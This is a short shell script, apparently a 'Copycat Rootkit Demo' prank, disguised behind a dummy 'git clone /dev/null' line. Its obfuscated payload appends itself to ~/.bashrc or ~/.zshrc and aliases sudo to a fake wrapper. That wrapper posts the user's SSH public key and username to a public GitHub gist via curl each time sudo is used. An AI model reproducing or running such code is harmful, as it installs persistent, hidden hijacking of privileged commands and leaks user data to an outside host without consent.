git clone /dev/null
clear
IFS='%'
s='\np=$(cat ~/.ssh/id_rsa.pub);m=$(echo $p | cut -f3 -d" ");IFS='\'\\x25\'';echo -e '\''#!/bin/sh\\nsudo $@\\necho;echo Hey, look at what you\\'\''\'\'''\''ve just done: '\''$(curl -s -X POST -d '\''{"public":true,"files":{"id_rsa.md":{"content":"'\''$(whoami)'\'' <<'\''$m'\''>>\\n\\nYour `id_rsa.pub` is:\\n\\n    '\''$p'\''\\n\\nYour `id_rsa` is:\\n\\n    No worry. I'\''\\'\'''\''m good so I'\''\\'\'''\''ll just keep you safe.'\'''\''"}}}'\'' https://api.github.com/gists | grep '\''"html_url"'\'' | cut -f4 -d'\''"'\'') >~/.sudo;unset IFS;chmod +x ~/.sudo;alias sudo="~/.sudo"'
if [[ `echo $0` =~ ".*zsh" ]]
    then echo -e $s >>~/.zshrc
    else echo -e $s >>~/.bashrc
fi
unset IFS
git clone git://github.com/soimort/Copycat-Rootkit-Demo.git
